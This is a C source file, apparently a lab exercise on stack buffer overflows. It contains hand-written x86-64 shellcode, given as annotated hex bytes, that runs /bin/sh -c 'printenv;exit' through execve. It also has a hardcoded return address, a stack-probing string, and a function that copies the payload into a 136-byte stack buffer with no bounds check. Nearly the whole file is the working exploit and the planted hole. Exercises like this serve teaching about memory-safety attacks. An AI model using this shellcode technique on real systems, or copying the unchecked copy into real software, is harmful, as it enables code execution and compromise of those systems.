#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// Variable to contain hex bytes of shell code
char compromise[159] = {
    0x90,0x90,0x90,0x90,0x90,          //padding
                                            //   bits 64
                                             //       ; find out where we are
    0xEB, 0x62,                    		    //2 start:     jmp short codeEnd
    0x5E,                     				//3 start2:    pop rsi
                                            //            ; clear the a register
    0x48,0x31,0xC0,              			//6         mov rax,0x0
                                            //            ; restore null bytes to data
    0x88, 0x46, 0x07,                  	    //9         mov [byte rsi+flagStr-exeStr-2],al
    0x88, 0x46, 0x0B,                  	    //12         mov [byte rsi+cmdStr-exeStr-1],al
    0x88, 0x46, 0x19,                  	    //15         mov [byte rsi+arrayAddr-exeStr-1],al
    0x48, 0x89, 0x46, 0x32,                 //19         mov [byte rsi+arrayAddr-exeStr+24],rax
                                            //           
                                            //            ; restore argv
                                            //            
    0x48, 0x89, 0x76, 0x1A,                 //23        mov [byte rsi + arrayAddr - exeStr],rsi
    0x48, 0x8D, 0x7E, 0x09,                 //27          lea rdi,[byte rsi + flagStr - exeStr] 
    0x48, 0x89, 0x7E, 0x22,                 //31          mov [byte rsi + arrayAddr - exeStr + 8],rdi
    0x48, 0x8D, 0x7E, 0x0C,                 //35           lea rdi, [byte rsi + cmdStr - exeStr]
    0x48, 0x89, 0x7E, 0x2A,                 //39         mov [byte rsi + arrayAddr - exeStr + 16],rdi
    
                                            //            ; execve system call
    0xB0, 0x3B,                 			//41          mov al,0x3b
    0x48, 0xBF,                 		  	//43         mov rdi,rsi
    //488D771A    
    0x48, 0x8D,0x76,0x1A,                   //47         lea rsi,[byte rdi + arrayAddr - exeStr]
    0x48, 0x89, 0xE2,                  	    //48          mov rdx,rsp
    0x48, 0xC1, 0xEA, 0x20,                 //52          shr rdx,32
    0x48, 0xC1, 0xE2, 0x20,                 //56          shl rdx,32
    0xB9, 0xFF, 0x56, 0xFB, 0xF7,           //61   
                                   		    //           mov ecx,0xf7fb56ff
    0x80,0xF1,0xFF,                         //64              xor cl,0xff                                         
    0x48, 0x09, 0xCA,                   	//67           or  rdx,rcx
    0x48, 0x8D, 0x3A,                   	//70           lea rdi,[rdx]
    0x0F, 0x05,                    		    //72           syscall
                                            //
                                            //            ; exit system call
    0x48, 0x89, 0xC7,                   	//75           mov rdi,rax
    0x48, 0x31, 0xC0,                   	//78          xor rax,rax
    0xB0, 0x3C,                    		    //80          mov al,0x3c
    0x0F, 0x05,                    		    //82          syscall
                                            //
    0xE8, 0xAB, 0xFF, 0xFF, 0xFF,           //87      codeEnd:   call start2
                                            //            ; data
    0x2F, 0x62, 0x69, 0x6E, 0x2F,           //92
    0x73, 0x68, 0x58, 0x79,      			//96     exeStr:    db "/bin/shXy"
    0x2D, 0x63, 0x58,                  	    //99     flagStr:   db "-cX"
    0x70, 0x72, 0x69, 0x6E, 0x74,           //104
    0x65, 0x6E, 0x76, 0x3B,     			//108    cmdStr:    db "printenv;exitX"
    0x65, 0x78, 0x69, 0x74, 0x58,           //113
    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//121 arrayAddr: dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//129          dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//137          dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//145         dq 0xffffffffffffffff
                                        	//newAddr:   dd newAddr-start
     // ret addy
     0xFF,0xDA,0xFF,0xFF,0xFF,0x7F,0x00    //154
    //rsp = 0x7fffffffdb98 - 154 +1 = 0x7fffffffdaff
};

// string variable to probe the stack and find the correct
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"//20
    "xxxxxxxxxxxxxxxxxxxx"//40
    "xxxxxxxxxxxxxxxxxxxx"//60
    "xxxxxxxxxxxxxxxxxxxx"//80
    "xxxxxxxxxxxxxxxxxxxx"//100
    "xxxxxxxxxxxxxxxxxxxx"//120
    "xxxxxxxxxxxxxxxxxxxx"//140 
    "xxxx"
    "\x4d\x4e\x4f\x50\x57\x58\x59\x5a"  //0x4d4e4f505758595a
    "xxxxxxxx"; 
     //0x7fffffffdb98 - 81 == 0x7fffffffdb47
    // environ == 0x7ffff7fb5600

int i;
void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}

